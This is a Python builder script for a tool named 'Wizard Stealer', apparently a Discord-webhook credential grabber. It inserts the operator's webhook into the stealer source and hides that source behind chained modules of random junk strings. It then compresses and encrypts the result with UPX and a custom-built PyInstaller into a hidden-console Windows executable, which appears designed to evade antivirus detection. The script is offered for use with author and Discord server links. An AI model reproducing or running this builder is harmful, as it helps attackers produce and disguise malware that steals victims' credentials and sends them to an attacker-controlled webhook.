import os
import random
import shutil
import string
import subprocess

import requests
from alive_progress import alive_bar

__BANNER__ = r"""


 ██╗    ██╗██╗███████╗ █████╗ ██████╗ ██████╗     ███████╗████████╗███████╗ █████╗ ██╗     ███████╗██████╗ 
██║    ██║██║╚══███╔╝██╔══██╗██╔══██╗██╔══██╗    ██╔════╝╚══██╔══╝██╔════╝██╔══██╗██║     ██╔════╝██╔══██╗
██║ █╗ ██║██║  ███╔╝ ███████║██████╔╝██║  ██║    ███████╗   ██║   █████╗  ███████║██║     █████╗  ██████╔╝
██║███╗██║██║ ███╔╝  ██╔══██║██╔══██╗██║  ██║    ╚════██║   ██║   ██╔══╝  ██╔══██║██║     ██╔══╝  ██╔══██╗
╚███╔███╔╝██║███████╗██║  ██║██║  ██║██████╔╝    ███████║   ██║   ███████╗██║  ██║███████╗███████╗██║  ██║
 ╚══╝╚══╝ ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝     ╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚═╝  ╚═╝
                                                                                                                      

                                                                                   
                                           
                                    Made By: github.com/noelshawty
                                    My Server: discord.gg/WjZMchBJ
                                
"""
__UPX__ = requests.get("https://github.com/upx/upx/releases/download/v3.96/upx-3.96-win64.zip", 
                       allow_redirects=True)
__PYINSTALLER__ = requests.get("https://github.com/pyinstaller/pyinstaller/archive/refs/tags/v5.1.zip",
                               allow_redirects=True)
__BUILDENV__ = "./buildenv"; shutil.rmtree('./buildenv') if os.path.isdir('./buildenv') else None; os.makedirs(__BUILDENV__, exist_ok=True)

def main():
    print(__BANNER__)
    
    webhook = input("{:<27}: ".format("Discord Webhook?"))
    
    # code = requests.get("https://raw.githubusercontent.com/noelshawty/Wizard-Grabber/main/main.py").text
    with open(file=".\main.py", mode="r", encoding='utf-8') as f: code = f.read()
    
    code = code.replace("&WEBHOOK_URL&", webhook)
    
    
    imports = [i for i in code.split("\n") if i.startswith("import") or i.startswith("from")]
    alphabet = random.sample([char for char in string.ascii_uppercase], len(string.ascii_uppercase))
    first = alphabet[0]
    with alive_bar(len(alphabet)) as bar:
        while (len(alphabet) > 0):
            if (len(alphabet) == 1):
                main = alphabet[0]
                with open(file=f"{__BUILDENV__}/{main}.py", mode="w", encoding='utf-8') as f:
                    f.write(code)
                alphabet.pop(0)
                bar.text(f"Creating entropy | {main}"); bar()
            else:
                cur = alphabet[0]
                next = alphabet[1]
                alphabet.remove(cur)
                with open(file=f"{__BUILDENV__}/{cur}.py", mode="w", encoding='utf-8') as f:
                    to_write = f"import {next}; {next}.main()\ndef main():\n"
                    for i in range(100):
                        var, con = "".join(random.choice(string.ascii_letters) for i in range(1000)), "".join(random.choice(string.ascii_letters) for i in range(1000))
                        to_write += f"  {var} = '{con}'\n" if not f"{var} = '{con}'\n" in to_write else "\r"
                    f.write(to_write)
                    bar.text(f"Creating entropy | {cur}"); bar()
    
    with open(file=f"{__BUILDENV__}\\upx.zip", mode="wb") as f: f.write(__UPX__.content)
    shutil.unpack_archive(f"{__BUILDENV__}\\upx.zip", f"{__BUILDENV__}\\upx"); os.remove(f"{__BUILDENV__}\\upx.zip")
    
    install_pyinstaller()
    subprocess.run(f'cd {__BUILDENV__} && py -3.10 -m PyInstaller --onefile --noconsole --upx-dir upx/{os.listdir(f"{__BUILDENV__}/upx")[0]} --icon NONE --distpath ../ --key EMPRYREAN --name built {first}.py', shell=True) #, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    
    shutil.rmtree(__BUILDENV__) if os.path.isdir(__BUILDENV__) else None
    
def install_pyinstaller():
    with open(file=f"{__BUILDENV__}\\pyinstaller.zip", mode="wb") as f: f.write(__PYINSTALLER__.content)
    shutil.unpack_archive(f"{__BUILDENV__}\\pyinstaller.zip", f"{__BUILDENV__}\\pyinstaller"); os.remove(f"{__BUILDENV__}\\pyinstaller.zip")

    subprocess.run('pip uninstall -y pyinstaller', shell=True) #, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    subprocess.run(f'cd {__BUILDENV__}/pyinstaller/pyinstaller-5.1/bootloader/ && py -3.10 ./waf all --target-arch=64bit', shell=True) #, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    subprocess.run(f'cd {__BUILDENV__}/pyinstaller/pyinstaller-5.1/ && py -3.10 setup.py install', shell=True) #, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    
if __name__ == "__main__":
    main()
